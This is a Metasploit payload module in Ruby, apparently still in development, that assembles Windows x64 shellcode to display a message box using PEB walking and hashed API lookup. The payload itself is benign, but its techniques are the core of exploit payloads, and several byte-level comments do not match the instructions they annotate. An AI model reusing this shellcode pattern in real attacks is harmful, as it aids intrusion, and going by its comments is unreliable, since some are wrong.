##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

#in develop
module MetasploitModule

  CachedSize = 275

  include Msf::Payload::Windows
  include Msf::Payload::Single

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows x64 MessageBox',
      'Description'   => 'Execute a messagebox (Windows x64)',
      'Author'        => [
	      'pasta <jaguinaga[at]infobytesec.com>'
      ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X64,
      ))
    register_options(
      [
        OptString.new('MSG', [ true, "The message" ]),
	OptString.new('TITLE', [ true, "The title"]),
      ])
  end

  def ror(x, n, bits=32)
    mask = (2**n) - 1
    mask_bits = x & mask
    return (x >> n) | (mask_bits << (bits - n))
  end

  def rol(x, n, bits = 32)
    return ror(x, bits - n, bits)
  end

  def hash(msg)
    hash = 0
    msg.each_byte {|c|
      hash = ror(c.ord + hash, 0xd)
      #puts "%c - %.8x" % [c, hash]
    }
    return hash
  end

  def to_unicode(msg)
    return msg.encode("binary").split('').join("\x00") + "\x00\x00"
  end

  def api_hash(libname, function)
    return (hash(to_unicode(libname.upcase)) + hash(function)) & 0xffffffff
  end

  def generate
	messagebox = api_hash("user32.dll", "MessageBoxA")
	
 	payload_data =  "\xFC"							# cld
	payload_data << "\x48\x83\xE4\xF0"					# and rsp,0xfffffffffffffff0
	payload_data << "\xE8\xC0\x00\x00\x00"					# call stage
	payload_data << "\x41\x51"						# push r9
	payload_data << "\x41\x50"						# push r8
	payload_data << "\x52"							# push rdx
	payload_data << "\x51"							# push rcx
        payload_data << "\x56"							# push rsi
	payload_data << "\x48\x31\xD2"						# xor rdx,rdx
	payload_data << "\x65\x48\x8B\x52\x60"					# mov rdx,qword ptr gs:[rdx+0x60]
	payload_data << "\x48\x8B\x52\x18"					# mov rdx,qword ptr ds:[rdx+0x18]
	payload_data << "\x48\x8B\x52\x20"					# mov rdx,qword ptr ds:[rdx+0x20]
        payload_data << "\x48\x8B\x72\x50"					# mov rdx,qword ptr ds:[rdx+0x50]
	payload_data << "\x48\x0F\xB7\x4A\x4A"					# movzx rcx,word ptr ds:[rdx+0x4a]
	payload_data << "\x4D\x31\xC9"						# xor r9,r9
	# nextchar:
	payload_data << "\x48\x31\xC0"						# xor rax,rax
	payload_data << "\xAC"							# lodsb
	payload_data << "\x3C\x61"						# cmp al,0x61
	payload_data << "\x7C\x02"						# jl uppercase
	payload_data << "\x2C\x20"						# sub al,0x20
	# uppercase:
	payload_data << "\x41\xC1\xC9\x0D"					# ror r9d,0xd
	payload_data << "\x41\x01\xC1"						# add r9d,eax
	payload_data << "\xE2\xED"						# loop nextchar
        payload_data << "\x52"							# push rdx
	payload_data << "\x41\x51"						# push r9
	payload_data << "\x48\x8B\x52\x20"					# mov rdx,qword ptr ds:[rdx+0x20]
	payload_data << "\x8B\x42\x3C"						# mov eax,dword ptr ds:[rdx+0x3c]
	payload_data << "\x48\x01\xD0"						# add rax,rdx
	payload_data << "\x8B\x80\x88\x00\x00\x00"				# mov eax,dword ptr ds:[rax+0x88]
	payload_data << "\x48\x85\xC0"						# test rax,rax
	payload_data << "\x74\x67"						# je nextmodule
	payload_data << "\x48\x01\xD0"						# add rax,rdx
	payload_data << "\x50"							# push rax
	payload_data << "\x8B\x48\x18"						# mov ecx,dword ptr ds:[rax+0x18]
	payload_data << "\x44\x8B\x40\x20"					# mov r8d,dword ptr ds:[rax+0x20]
	payload_data << "\x49\x01\xD0"						# add r8,rdx
	payload_data << "\xE3\x56"						# jrcxz nexmodule+1
	payload_data << "\x48\xFF\xC9"						# dec rcx
	payload_data << "\x41\x8B\x34\x88"					# mov esi,dword ptr ds:[r8+rcx*4]
	payload_data << "\x48\x01\xD6"						# add rsi,rdx
	payload_data << "\x4D\x31\xC9"						# xor r9,r9
	# nextcharapi:
	payload_data << "\x48\x31\xC0"						# xor rax,rax
	payload_data << "\xAC"							# lodsb
	payload_data << "\x41\xC1\xC9\x0D"					# ror r9d,0xd
	payload_data << "\x41\x01\xC1"						# add r9d,eax
	payload_data << "\x38\xE0"						# cmp al,ah
	payload_data << "\x75\xF1"						# jne netxcharapi
	payload_data << "\x4C\x03\x4C\x24\x08"					# add r9,qword ptr ss:[rsp+0x8]
	payload_data << "\x45\x39\xD1"						# cmp r9d,r10d
	payload_data << "\x75\xD8"						# jne 
	payload_data << "\x58"							# pop rax
	payload_data << "\x44\x8B\x40\x24"					# mov r8d,dword ptr ds:[rax+0x24]
	payload_data << "\x49\x01\xD0"						# add r8,rdx
	payload_data << "\x66\x41\x8B\x0C\x48"					# mov cx,word ptr ds:[r8+rcx*2]
	payload_data << "\x44\x8B\x40\x1C"					# mov r8d,dword ptr ds:[rax+0x1c]
	payload_data << "\x49\x01\xD0"						# add r8,rdx
	payload_data << "\x41\x8B\x04\x88"					# mov rax,dword ptr ds:[r8+rcx*4]
	payload_data << "\x48\x01\xD0"						# add r8,rdx
	payload_data << "\x41\x58"						# pop r8
	payload_data << "\x41\x58"						# pop r8
	payload_data << "\x5E"							# pop rsi
	payload_data << "\x59"							# pop rcx
	payload_data << "\x5A"							# pop rdx
	payload_data << "\x41\x58"						# pop r8
	payload_data << "\x41\x59"						# pop r9
	payload_data << "\x41\x5A"						# pop r10
	payload_data << "\x48\x83\xEC\x20"					# sub rsp,0x20
	payload_data << "\x41\x52"						# push r10
	payload_data << "\xFF\xE0"						# jmp rax
	payload_data << "\x58"							# pop rax
	payload_data << "\x41\x59"						# pop r9
	payload_data << "\x5A"							# pop rdx
	payload_data << "\x48\x8B\x12"						# mov rdx,qword ptr ds:[rdx]
	payload_data << "\xE9\x57\xFF\xFF\xFF"					# jmp 
	# stage:
	payload_data << "\x5D"							# pop rbp
	payload_data << "\x4D\x33\xC9"						# xor r9,r9
	payload_data << "\x4C\x8D\x85" + [0x104].pack("<L")			# lea r8,qword ptr ss:[rbp+offsetMSG]
	payload_data << "\x48\x8D\x95" + [0x105 + datastore['MSG'].length].pack("<L")	# lea rdx,qword ptr ss:[rbp+offsetTITLE]
	payload_data << "\x48\x33\xC9"						# xor rcx,rcx
	payload_data << "\x41\xBA" + [messagebox].pack("<L")			# mov r10d,0x07568345
	payload_data << "\xFF\xD5"						# call rbp
	payload_data << "\xBB\xE0\x1D\x2A\x0A"					# mov ebx,0xa2a1de0
	payload_data << "\x41\xBA\xA6\x95\xBD\x9D"				# mov r10d,0x9dbd95a6 ; kernel32.GetVersion
	payload_data << "\xFF\xD5"						# call rbp
	payload_data << "\x48\x83\xC4\x28"					# add rsp,0x28
	payload_data << "\x3C\x06"						# cmp al,0x6
	payload_data << "\x7C\x0A"						# jl 
	payload_data << "\x80\xFB\xE0"						# cmp bl,0xe0
	payload_data << "\x75\x05"						# jne
	payload_data << "\xBB\x47\x13\x72\x6F"					# mov ebx,0x6f721347 ; ntdll.RtlExitUserThread
	payload_data << "\x6A\x00"						# push 0
	payload_data << "\x59"							# pop rcx
	payload_data << "\x41\x89\xDA"						# mov r10d,ebx
	payload_data << "\xFF\xD5"						# call rbp

	payload_data << datastore['MSG'] + "\x00"
	payload_data << datastore['TITLE'] + "\x00"
	
	return payload_data

  end
end
